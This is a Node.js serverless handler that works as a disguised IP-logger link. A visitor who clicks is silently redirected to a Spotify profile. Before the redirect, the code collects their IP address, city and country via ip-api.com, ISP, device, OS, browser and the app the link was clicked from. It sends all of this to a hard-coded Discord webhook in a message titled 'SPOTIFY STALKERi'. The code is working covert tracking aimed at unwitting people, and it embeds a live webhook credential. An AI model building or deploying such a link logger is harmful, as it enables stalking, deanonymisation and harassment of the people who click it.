const https = require('https');
const UAParser = require('ua-parser-js');

const WEBHOOK = 'https://discord.com/api/webhooks/1513283799583162458/SeJddnVhH8sK1REjZwc9yhTaon0cG7kY85Q8VFhqhfDo2BQstD3-lncKGKoIIuXcYDmO';
const REDIRECT = 'https://open.spotify.com/user/zx9oehv0zw9qx96qowlby0ktl?si=22be720da7b1485a';

function fetchJSON(url) {
  return new Promise((resolve, reject) => {
    https.get(url, res => {
      let data = '';
      res.on('data', c => data += c);
      res.on('end', () => { try { resolve(JSON.parse(data)); } catch(e) { reject(e); } });
    }).on('error', reject);
  });
}

function detectApp(ua, referrer) {
  const checks = [
    [/WhatsApp/i, 'WhatsApp'],
    [/Instagram/i, 'Instagram'],
    [/FBAN|FBAV|Facebook/i, 'Facebook'],
    [/Messenger/i, 'Facebook Messenger'],
    [/Telegram/i, 'Telegram'],
    [/Twitter|Tweetbot/i, 'Twitter/X'],
    [/Discord/i, 'Discord'],
    [/LinkedIn/i, 'LinkedIn'],
    [/Snapchat/i, 'Snapchat'],
    [/TikTok/i, 'TikTok'],
    [/Pinterest/i, 'Pinterest'],
    [/Reddit/i, 'Reddit'],
    [/Signal/i, 'Signal'],
    [/Skype/i, 'Skype'],
    [/Viber/i, 'Viber'],
    [/LINE/i, 'LINE'],
    [/MicroMessenger/i, 'WeChat'],
    [/Kik/i, 'Kik'],
    [/GroupMe/i, 'GroupMe'],
    [/okhttp/i, 'Android Uygulama'],
    [/^https?:\/\/(?:www\.)?(?:l\.)?instagram\.com/i, 'Instagram'],
    [/^https?:\/\/(?:www\.)?(?:m\.)?facebook\.com/i, 'Facebook'],
    [/^https?:\/\/(?:www\.)?twitter\.com/i, 'Twitter/X'],
    [/^https?:\/\/(?:www\.)?t\.co/i, 'Twitter/X'],
    [/^https?:\/\/(?:www\.)?reddit\.com/i, 'Reddit'],
    [/^https?:\/\/(?:www\.)?linkedin\.com/i, 'LinkedIn'],
    [/^https?:\/\/(?:www\.)?tiktok\.com/i, 'TikTok'],
    [/^https?:\/\/(?:www\.)?pinterest\.com/i, 'Pinterest'],
    [/^https?:\/\/(?:www\.)?snapchat\.com/i, 'Snapchat'],
    [/^https?:\/\/(?:www\.)?wa\.me|api\.whatsapp/i, 'WhatsApp'],
    [/^https?:\/\/l\.facebook\.com/i, 'Facebook'],
    [/^https?:\/\/(?:www\.)?youtube\.com/i, 'YouTube'],
  ];
  for (const [pattern, name] of checks) {
    if (pattern.test(ua) || pattern.test(referrer)) return name;
  }
  return referrer || 'Doğrudan / Bilinmiyor';
}

function postJSON(url, payload) {
  return new Promise((resolve, reject) => {
    const data = JSON.stringify(payload);
    const u = new URL(url);
    const opts = { hostname: u.hostname, path: u.pathname, method: 'POST', headers: { 'Content-Type': 'application/json', 'Content-Length': Buffer.byteLength(data) } };
    const req = https.request(opts, () => resolve());
    req.on('error', reject);
    req.write(data);
    req.end();
  });
}

module.exports = async (req, res) => {
  try {
    const ip = req.headers['x-forwarded-for']?.split(',')[0]?.trim() || req.socket.remoteAddress;
    const uaStr = req.headers['user-agent'] || '';
    const referrer = req.headers['referer'] || 'Doğrudan';

    const parser = new UAParser(uaStr);
    const browser = parser.getBrowser();
    const os = parser.getOS();
    const device = parser.getDevice();

    let geo = {};
    try { geo = await fetchJSON('http://ip-api.com/json/' + ip + '?fields=city,country,isp,org,as,query'); } catch(e) {}

    const lines = [
      '**SPOTIFY STALKERi !!!**',
      '',
      '**IP :** ' + ip,
      '**Konum :** ' + (geo.city ? geo.city + ', ' + geo.country : 'Bilinmiyor'),
      '**Linke Tıklanan Uygulama :** ' + detectApp(uaStr, referrer),
      '**Cihaz :** ' + (device.vendor || device.model || 'Bilinmiyor') + (device.model ? ' ' + device.model : ''),
      '**İşletim Sistemi :** ' + (os.name || 'Bilinmiyor') + (os.version ? ' ' + os.version : ''),
      '**Tarayıcı :** ' + (browser.name || 'Bilinmiyor') + (browser.version ? ' ' + browser.version : ''),
      '**ISS :** ' + (geo.isp || geo.org || 'Bilinmiyor'),
      '**Tarih :** ' + new Date().toLocaleString('tr-TR'),
      '',
      '                                                        made by wer1x'
    ];

    await postJSON(WEBHOOK, { content: lines.join('\n') });
  } catch(e) {}

  res.writeHead(302, { Location: REDIRECT });
  res.end();
};
